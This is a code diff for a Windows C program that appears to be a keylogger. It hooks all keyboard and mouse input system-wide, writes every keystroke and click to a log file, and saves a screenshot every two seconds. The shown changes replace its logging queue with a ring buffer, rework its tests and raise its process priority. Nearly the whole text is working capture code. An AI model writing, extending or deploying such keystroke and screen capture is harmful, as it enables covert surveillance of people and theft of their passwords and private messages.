@@ -1,6 +1,5 @@
 #include <windows.h>
 #include <stdio.h>
-#include <time.h>
 #include <process.h>
 #include <assert.h>
 #include <stdlib.h>
@@ -15,200 +14,87 @@
 #define SCREENSHOT_INTERVAL 2000 // ms
 #define OUTPUT_FOLDER "output"
 #define PATH_TO_LOG_FILE OUTPUT_FOLDER "/log.txt"
+#define MAX_LOG_ENTRIES 512 // Max log entries in the ring buffer Must be power of 2!
+#define MAX_MSG_LENGTH 256
 volatile BOOL ACTIVE = TRUE;
 
 /*
 //
-// Logging Queue Implementation
-//
+// Ring Buffer Implementation
 */
 
-// Define queue node for logging
-typedef struct LogNode
+typedef struct
 {
-    char message[256];
-    struct LogNode *next;
-} LogNode_t;
+    char message[MAX_MSG_LENGTH];
+} LogEntry_t;
 
-// Queue structure for log messages
-typedef struct LogQueue
+typedef struct
 {
-    LogNode_t *head;
-    LogNode_t *tail;
+    LogEntry_t *entries;
+    size_t head;
+    size_t tail;
     size_t count;
     CRITICAL_SECTION lock;
-    HANDLE logEvent;
-} LogQueue_t;
+    HANDLE event;
+} RingBuffer_t;
 
-LogQueue_t logQueue;
+RingBuffer_t ringBuffer;
 
-// Initialize log queue
-void InitLogQueue()
+// Initialize ring buffer
+void InitRingBuffer()
 {
-    logQueue.head = NULL;
-    logQueue.tail = NULL;
-    logQueue.count = 0;
-    InitializeCriticalSection(&logQueue.lock);
-    logQueue.logEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+    ringBuffer.entries = (LogEntry_t *)malloc(MAX_LOG_ENTRIES * sizeof(LogEntry_t));
+    ringBuffer.head = 0;
+    ringBuffer.tail = 0;
+    ringBuffer.count = 0;
+    InitializeCriticalSection(&ringBuffer.lock);
+    ringBuffer.event = CreateEvent(NULL, FALSE, FALSE, NULL);
 }
 
 // Enqueue log message
 void EnqueueLog(const char *message)
 {
-    LogNode_t *newNode = (LogNode_t *)malloc(sizeof(LogNode_t));
-    if (newNode == NULL)
-        return;
-
-    strcpy(newNode->message, message);
-    newNode->next = NULL;
-
-    EnterCriticalSection(&logQueue.lock);
-    if (logQueue.tail == NULL)
+    EnterCriticalSection(&ringBuffer.lock);
+    if (ringBuffer.count < MAX_LOG_ENTRIES)
     {
-        logQueue.head = logQueue.tail = newNode;
-    }
-    else
-    {
-        logQueue.tail->next = newNode;
-        logQueue.tail = newNode;
+        // Copying the msg into the preallocated entry
+        strncpy(ringBuffer.entries[ringBuffer.head].message, message, MAX_MSG_LENGTH - 1);
+        ringBuffer.entries[ringBuffer.head].message[MAX_MSG_LENGTH - 1] = '\0';
+
+        ringBuffer.head = (ringBuffer.head + 1) & (MAX_LOG_ENTRIES - 1);
+        ringBuffer.count++;
+
+        SetEvent(ringBuffer.event);
     }
 
-    logQueue.count++;
-    LeaveCriticalSection(&logQueue.lock);
-    SetEvent(logQueue.logEvent);
+    LeaveCriticalSection(&ringBuffer.lock);
 }
 
 // Dequeue log message
-char *DequeueLog()
+BOOL DequeueLog(char *buffer)
 {
-    EnterCriticalSection(&logQueue.lock);
-    if (logQueue.head == NULL)
+    BOOL success = FALSE;
+    EnterCriticalSection(&ringBuffer.lock);
+
+    if (ringBuffer.count > 0)
     {
-        LeaveCriticalSection(&logQueue.lock);
-        return NULL;
+
+        strcpy(buffer, ringBuffer.entries[ringBuffer.tail].message);
+        ringBuffer.tail = (ringBuffer.tail + 1) & (MAX_LOG_ENTRIES - 1);
+        ringBuffer.count--;
+        success = TRUE;
     }
 
-    LogNode_t *temp = logQueue.head;
-    char *message = strdup(temp->message);
-    logQueue.head = logQueue.head->next;
-    if (logQueue.head == NULL)
-        logQueue.tail = NULL;
-
-    logQueue.count--;
-    free(temp);
-    LeaveCriticalSection(&logQueue.lock);
-    return message;
+    LeaveCriticalSection(&ringBuffer.lock);
+    return success;
 }
 
-size_t GetLogQueueSize()
+void DestroyRingBuffer()
 {
-    size_t size;
-    EnterCriticalSection(&logQueue.lock);
-    size = logQueue.count;
-    LeaveCriticalSection(&logQueue.lock);
-    return size;
+    DeleteCriticalSection(&ringBuffer.lock);
+    CloseHandle(ringBuffer.event);
+    free(ringBuffer.entries);
 }
-
-void WriteLogsToFile()
-{
-    FILE *file = fopen(PATH_TO_LOG_FILE, "a");
-    if (file)
-    {
-        char *logMessage;
-        while ((logMessage = DequeueLog()) != NULL)
-        {
-            fprintf(file, "%s\n", logMessage);
-            free(logMessage);
-        }
-        fclose(file);
-    }
-}
-
-// Logging thread function
-unsigned __stdcall LogWriterThread(void *arg)
-{
-    while (ACTIVE)
-    {
-        WaitForSingleObject(logQueue.logEvent, INFINITE);
-
-        WriteLogsToFile();
-
-        ResetEvent(logQueue.logEvent);
-    }
-    return 0;
-}
-
-#ifdef RUN_TESTS
-void TestQueueLogic()
-{
-
-    printf("Testing Log Queue Logic\n");
-
-    InitLogQueue();
-
-    EnqueueLog("Message 1");
-    EnqueueLog("Message 2");
-
-    assert(GetLogQueueSize() == 2);
-
-    char *m1 = DequeueLog();
-    assert(strcmp(m1, "Message 1") == 0);
-    free(m1);
-
-    char *m2 = DequeueLog();
-    assert(strcmp(m2, "Message 2") == 0);
-    free(m2);
-
-    char *m3 = DequeueLog();
-    assert(m3 == NULL);
-
-    assert(GetLogQueueSize() == 0);
-
-    printf("Success: Log Queue Logic Tests Passed!\n");
-}
-
-#define THREAD_COUNT 4
-#define ITEMS_PER_THREAD 100000
-
-unsigned __stdcall HammerThread(void *arg)
-{
-    for (int i = 0; i < ITEMS_PER_THREAD; i++)
-    {
-        EnqueueLog("Hammer Message");
-    }
-    return 0;
-}
-
-void TestConcurrentQueue()
-{
-    InitLogQueue();
-    HANDLE threads[THREAD_COUNT];
-
-    printf("Testing Hammering Test with %d threads & total messages %d\n", THREAD_COUNT, (THREAD_COUNT * ITEMS_PER_THREAD));
-
-    for (int i = 0; i < THREAD_COUNT; i++)
-    {
-        threads[i] = (HANDLE)_beginthreadex(NULL, 0, HammerThread, NULL, 0, NULL);
-    }
-
-    WaitForMultipleObjects(THREAD_COUNT, threads, TRUE, INFINITE);
-    assert(GetLogQueueSize() == (THREAD_COUNT * ITEMS_PER_THREAD));
-
-    int count = 0;
-    char *msg;
-    while ((msg = DequeueLog()) != NULL)
-    {
-        count++;
-        free(msg);
-    }
-
-    for (int i = 0; i < THREAD_COUNT; i++)
-        CloseHandle(threads[i]);
-
-    assert(count == (THREAD_COUNT * ITEMS_PER_THREAD));
-    printf("Success: Hammering Test Passed!\n");
-}
-#endif
 
 /*
 //
@@ -255,7 +141,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         }
 
         // Prepare log message (start with modifiers)
-        char logMessage[256] = {0};
+        char logMessage[MAX_MSG_LENGTH] = {0};
         if (ctrlPressed)
             strcat(logMessage, "Ctrl + ");
         if (shiftPressed)
@@ -330,6 +216,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             strcat(logMessage, "Down Arrow");
             break;
         default:
+
             // Handle Numeric Keypad keys (VK_NUMPADx)
             if (pKeyBoard->vkCode >= VK_NUMPAD0 && pKeyBoard->vkCode <= VK_NUMPAD9)
             {
@@ -374,7 +261,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             break;
         }
 
-        // Enqueue log message
         EnqueueLog(logMessage);
     }
 
@@ -387,7 +273,7 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
     if (nCode >= 0)
     {
         MSLLHOOKSTRUCT *pMouse = (MSLLHOOKSTRUCT *)lParam;
-        char logMessage[256];
+        char logMessage[MAX_MSG_LENGTH];
 
         switch (wParam)
         {
@@ -403,7 +289,6 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
         default:
             return CallNextHookEx(NULL, nCode, wParam, lParam);
         }
-
         EnqueueLog(logMessage);
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
@@ -486,14 +371,34 @@ void TakeScreenshot(const char *filename)
 // Screenshot thread function
 unsigned __stdcall ScreenshotThread(void *arg)
 {
+    SYSTEMTIME lt;
     while (ACTIVE)
     {
         Sleep(SCREENSHOT_INTERVAL);
         char filename[MAX_PATH];
-        time_t now = time(NULL);
-        struct tm *t = localtime(&now);
-        snprintf(filename, sizeof(filename), "%s/screenshot_%04d%02d%02d_%02d%02d%02d.bmp", OUTPUT_FOLDER, t->tm_year + 1900, t->tm_mon + 1, t->tm_mday, t->tm_hour, t->tm_min, t->tm_sec);
+        GetLocalTime(&lt);
+        snprintf(filename, sizeof(filename), "%s/screenshot_%04d_%02d_%02d_%02d%02d_%02d.bmp", OUTPUT_FOLDER, lt.wYear, lt.wMonth, lt.wDay, lt.wHour, lt.wMinute, lt.wSecond);
         TakeScreenshot(filename);
+    }
+    return 0;
+}
+
+// Logging thread function
+unsigned __stdcall LogWriterThread(void *arg)
+{
+    char msg[MAX_MSG_LENGTH];
+    while (ACTIVE)
+    {
+        WaitForSingleObject(ringBuffer.event, INFINITE);
+
+        FILE *file = fopen(PATH_TO_LOG_FILE, "a");
+        if (file)
+        {
+            while (DequeueLog(msg))
+                fprintf(file, "%s\n", msg);
+
+            fclose(file);
+        }
     }
     return 0;
 }
@@ -550,25 +455,120 @@ void DisplayHeader()
     printf("======================================================\n\n");
 }
 
+#ifdef RUN_TESTS
+size_t GetRingBufferSize()
+{
+    size_t size;
+    EnterCriticalSection(&ringBuffer.lock);
+    size = ringBuffer.count;
+    LeaveCriticalSection(&ringBuffer.lock);
+    return size;
+}
+
+void TestRingBufferLogic()
+{
+
+    printf("Testing Ring Buffer Logic\n");
+
+    InitRingBuffer();
+
+    EnqueueLog("Message 1");
+    EnqueueLog("Message 2");
+
+    assert(GetRingBufferSize() == 2);
+
+    char buffer[MAX_MSG_LENGTH];
+    BOOL success1 = DequeueLog(buffer);
+    assert(success1 == TRUE);
+    assert(strcmp(buffer, "Message 1") == 0);
+
+    BOOL success2 = DequeueLog(buffer);
+    assert(success2 == TRUE);
+    assert(strcmp(buffer, "Message 2") == 0);
+
+    BOOL success3 = DequeueLog(buffer);
+    assert(success3 == FALSE);
+
+    assert(GetRingBufferSize() == 0);
+
+    DestroyRingBuffer();
+    printf("Success: Log Queue Logic Tests Passed!\n\n");
+}
+
+#define THREAD_COUNT 4
+#define ITEMS_PER_THREAD MAX_LOG_ENTRIES / THREAD_COUNT
+
+unsigned __stdcall HammerThread(void *arg)
+{
+    for (int i = 0; i < ITEMS_PER_THREAD; i++)
+        EnqueueLog("Hammer Message");
+
+    return 0;
+}
+
+void TestConcurrentQueue()
+{
+    InitRingBuffer();
+    HANDLE threads[THREAD_COUNT];
+    char buffer[MAX_MSG_LENGTH];
+
+    printf("Testing Hammering Test with %d threads & total messages %d\n", THREAD_COUNT, (THREAD_COUNT * ITEMS_PER_THREAD));
+    assert(GetRingBufferSize() == 0);
+
+    for (int i = 0; i < THREAD_COUNT; i++)
+        threads[i] = (HANDLE)_beginthreadex(NULL, 0, HammerThread, NULL, 0, NULL);
+
+    WaitForMultipleObjects(THREAD_COUNT, threads, TRUE, INFINITE);
+    assert(GetRingBufferSize() == (THREAD_COUNT * ITEMS_PER_THREAD));
+
+    int count = 0;
+    while (DequeueLog(buffer))
+        count++;
+
+    for (int i = 0; i < THREAD_COUNT; i++)
+        CloseHandle(threads[i]);
+
+    assert(count == (THREAD_COUNT * ITEMS_PER_THREAD));
+    DestroyRingBuffer();
+    printf("Success: Hammering Tests Passed!\n\n");
+}
+#endif
+
 int main()
 {
 
 #ifdef RUN_TESTS
-    TestQueueLogic();
+    TestRingBufferLogic();
     TestConcurrentQueue();
+    Sleep(10000);
     return 0;
 #endif
 
-    DisplayHeader();
+    assert((MAX_LOG_ENTRIES & (MAX_LOG_ENTRIES - 1)) == 0);
+
     mainThreadId = GetCurrentThreadId();
     cleanupFinished = CreateEvent(NULL, TRUE, FALSE, NULL);
 
-    if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE))
+    if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE)ConsoleHandler, TRUE))
         return 1;
 
-    if (AlreadyRunning() == TRUE)
+    if (AlreadyRunning())
     {
         MessageBoxA(NULL, "Already running", "Error!", MB_ICONERROR | MB_OK | MB_SETFOREGROUND);
+
+        return 1;
+    }
+
+    if (!SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS))
+    {
+        MessageBoxA(NULL, "Failed to set process priority", "Error!", MB_ICONERROR | MB_OK);
+
+        return 1;
+    }
+
+    if (!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST))
+    {
+        MessageBoxA(NULL, "Failed to set thread priority", "Error!", MB_ICONERROR | MB_OK);
 
         return 1;
     }
@@ -576,7 +576,8 @@ int main()
     if (!CreateDirectory(OUTPUT_FOLDER, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
         return 1;
 
-    InitLogQueue();
+    DisplayHeader();
+    InitRingBuffer();
 
     HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
     HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);
@@ -598,8 +599,7 @@ int main()
     SetEvent(cleanupFinished);
 
     // Clean up
-    DeleteCriticalSection(&logQueue.lock);
-    CloseHandle(logQueue.logEvent);
+    DestroyRingBuffer();
     CloseHandle(cleanupFinished);
     UnhookWindowsHookEx(keyboardHook);
     UnhookWindowsHookEx(mouseHook);
